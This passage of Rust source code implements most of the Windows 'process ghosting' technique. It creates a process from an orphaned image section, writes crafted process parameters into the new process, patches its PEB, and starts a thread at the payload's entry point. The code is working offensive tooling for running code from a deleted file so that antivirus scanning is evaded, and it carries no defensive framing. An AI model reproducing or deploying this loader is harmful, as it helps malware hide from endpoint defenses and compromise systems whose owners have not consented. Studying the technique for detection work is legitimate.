        if status != 0 {
            return Err(MiscError::GhostSectionFailed);
        }

        // ==== Step 3: Create ghost process from orphaned section ====
        let mut process_handle = HANDLE::default();
        let status = nt_create_process_ex(
            &mut process_handle,
            0x001FFFFF, // PROCESS_ALL_ACCESS
            std::ptr::null_mut(),
            GetCurrentProcess(),
            4, // PS_INHERIT_HANDLES
            section_handle,
            HANDLE::default(), // DebugPort
            HANDLE::default(), // ExceptionPort
            0, // InJob = FALSE
        );

        let _ = CloseHandle(section_handle);

        if status != 0 {
            return Err(MiscError::GhostNtCreateProcessFailed);
        }

        let pid = GetProcessId(process_handle);

        let cleanup = |ph: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(ph);
        };

        // ==== Step 4: Initialize process parameters ====
        // Prepare paths for process parameters
        let exe_wide: Vec<u16> = exe_path.encode_utf16().chain(std::iter::once(0)).collect();

        // Extract directory from exe_path for current directory
        let exe_dir = Path::new(exe_path)
            .parent()
            .unwrap_or(Path::new("C:\\"))
            .to_string_lossy()
            .to_string();
        let exe_dir_wide: Vec<u16> = exe_dir.encode_utf16().chain(std::iter::once(0)).collect();

        let mut us_image_path = UnicodeString::from_wide(&exe_wide);
        let mut us_current_dir = UnicodeString::from_wide(&exe_dir_wide);
        let mut us_command_line = UnicodeString::from_wide(&exe_wide);

        // Create environment block via userenv.dll
        let mut environment: *mut std::ffi::c_void = std::ptr::null_mut();
        let env_result = create_environment_block(
            &mut environment,
            HANDLE::default(), // NULL token = current user
            1, // bInherit = TRUE
        );

        if env_result == 0 || environment.is_null() {
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed("CreateEnvironmentBlock failed".into()));
        }

        // Create process parameters with RTL_USER_PROC_PARAMS_NORMALIZED flag
        let mut process_params: *mut std::ffi::c_void = std::ptr::null_mut();
        let status = rtl_create_process_parameters_ex(
            &mut process_params,
            &mut us_image_path,      // ImagePathName
            std::ptr::null_mut(),    // DllPath
            &mut us_current_dir,     // CurrentDirectory
            &mut us_command_line,    // CommandLine
            environment,             // Environment
            std::ptr::null_mut(),    // WindowTitle
            std::ptr::null_mut(),    // DesktopInfo
            std::ptr::null_mut(),    // ShellInfo
            std::ptr::null_mut(),    // RuntimeData
            1, // RTL_USER_PROC_PARAMS_NORMALIZED
        );

        if status != 0 || process_params.is_null() {
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed(format!(
                "RtlCreateProcessParametersEx failed with status 0x{:08X}", status
            )));
        }

        // Query PEB address via NtQueryInformationProcess
        let mut pbi = [0u8; 48]; // sizeof(PROCESS_BASIC_INFORMATION) on x64
        let mut return_length: u32 = 0;
        let status = nt_query_info_process(
            process_handle,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut _,
            48,
            &mut return_length,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::NtQueryFailed);
        }

        // PebBaseAddress is at offset 0x08 in PROCESS_BASIC_INFORMATION on x64
        let peb_address = u64::from_le_bytes([
            pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
        ]) as usize;

        // Read PEB to get ImageBase (offset 0x10 in PEB on x64)
        let mut peb_data = [0u8; 0x30];
        let mut bytes_read: usize = 0;
        let status = nt_read_virtual_memory(
            process_handle,
            peb_address as *const _,
            peb_data.as_mut_ptr() as *mut _,
            peb_data.len(),
            &mut bytes_read,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        let image_base = u64::from_le_bytes([
            peb_data[0x10], peb_data[0x11], peb_data[0x12], peb_data[0x13],
            peb_data[0x14], peb_data[0x15], peb_data[0x16], peb_data[0x17],
        ]) as usize;

        // Calculate env + params memory range (two scenarios for layout)
        let params_ptr = process_params as *const u8;

        // Length at offset 0x04 in RTL_USER_PROCESS_PARAMETERS
        let params_length = std::ptr::read_unaligned(params_ptr.add(0x04) as *const u32) as usize;
        // Environment pointer at offset 0x80
        let env_ptr = std::ptr::read_unaligned(params_ptr.add(0x80) as *const usize);
        // EnvironmentSize at offset 0x3F0
        let env_size = std::ptr::read_unaligned(params_ptr.add(0x3F0) as *const usize);

        // Scenario 1: base = params, end = params + length
        let params_base = process_params as usize;
        let params_end = params_base + params_length;

        let mut env_and_params_base = params_base;
        let mut env_and_params_end = params_end;

        if env_ptr != 0 {
            // Scenario 2: environment may be before params
            if params_base > env_ptr {
                env_and_params_base = env_ptr;
            }
            // Environment end may extend past params end
            if env_ptr + env_size > env_and_params_end {
                env_and_params_end = env_ptr + env_size;
            }
        }

        let mut total_size = env_and_params_end - env_and_params_base;

        // Allocate memory in remote process at the params address via NtAllocateVirtualMemory
        // Since params are NORMALIZED, internal pointers are absolute and already valid
        let mut remote_base = process_params;
        let status = nt_allocate_virtual_memory(
            process_handle,
            &mut remote_base,
            0,
            &mut total_size,
            0x00001000 | 0x00002000, // MEM_COMMIT | MEM_RESERVE
            0x04, // PAGE_READWRITE
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write process parameters to remote process via NtWriteVirtualMemory
        let mut bytes_written: usize = 0;
        let status = nt_write_virtual_memory(
            process_handle,
            process_params,
            process_params as *const _,
            params_length,
            &mut bytes_written,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Write environment block if present
        if env_ptr != 0 {
            let status = nt_write_virtual_memory(
                process_handle,
                env_ptr as *mut _,
                env_ptr as *const _,
                env_size,
                &mut bytes_written,
            );

            if status != 0 {
                let _ = rtl_destroy_process_parameters(process_params);
                destroy_environment_block(environment);
                cleanup(process_handle);
                return Err(MiscError::WriteFailed);
            }
        }

        // Update PEB.ProcessParameters (offset 0x20) to point to remote params
        let peb_process_params_addr = (peb_address + 0x20) as *mut std::ffi::c_void;
        let params_addr = process_params as usize;
        let status = nt_write_virtual_memory(
            process_handle,
            peb_process_params_addr,
            &params_addr as *const _ as *const _,
            std::mem::size_of::<usize>(),
            &mut bytes_written,
        );

        // Clean up local resources
        let _ = rtl_destroy_process_parameters(process_params);
        destroy_environment_block(environment);

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        // ==== Step 5: Create initial thread ====
        let entry_point_addr = (image_base as u64 + entry_point_rva) as *const std::ffi::c_void;

        let mut thread_handle = HANDLE::default();
        let status = nt_create_thread_ex(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process_handle,
            entry_point_addr,
            std::ptr::null(),
            0,    // Start immediately
            0,    // ZeroBits
            0,    // StackSize (0 = default from PE)
            0,    // MaximumStackSize (0 = default)
            std::ptr::null_mut(), // AttributeList
        );

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed(format!(
                "NtCreateThreadEx failed with status 0x{:08X}", status
            )));
        }

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}